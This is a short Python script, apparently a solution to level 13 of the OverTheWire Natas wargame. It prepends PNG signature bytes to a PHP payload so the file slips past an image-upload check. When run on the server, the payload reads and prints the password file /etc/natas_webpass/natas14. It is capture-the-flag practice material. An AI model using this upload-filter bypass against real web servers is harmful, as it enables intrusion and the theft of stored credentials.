# The starting bytes for a PNG according to the specification
# http://www.libpng.org/pub/png/spec/1.2/PNG-Rationale.html#R.PNG-file-signature

png_start_bytes_in_hex = [b'\x89', b'\x50', b'\x4e', b'\x47', b'\x0d', b'\x0a', b'\x1a', b'\x0a']
payload = """<?php

    $file = "/etc/natas_webpass/natas14";

    $myfile = fopen($file, "r") or die("Unable to open file!");
    echo fread($myfile, filesize($file));
    fclose($myfile);

"""

# Write the bytes and the payload to a php file

with open('./natas13/payload.php', 'wb+') as file:
    for byte in png_start_bytes_in_hex:
        file.write(byte)

    file.write(bytes(payload, 'utf-8'))

# Make sure the payload is good by checking the starting 8 bytes

with open('./natas13/payload.php', 'rb') as file:
    byte = file.read(1)
    print(byte)

    while byte != b'':
        byte = file.read(1)
        print(byte)
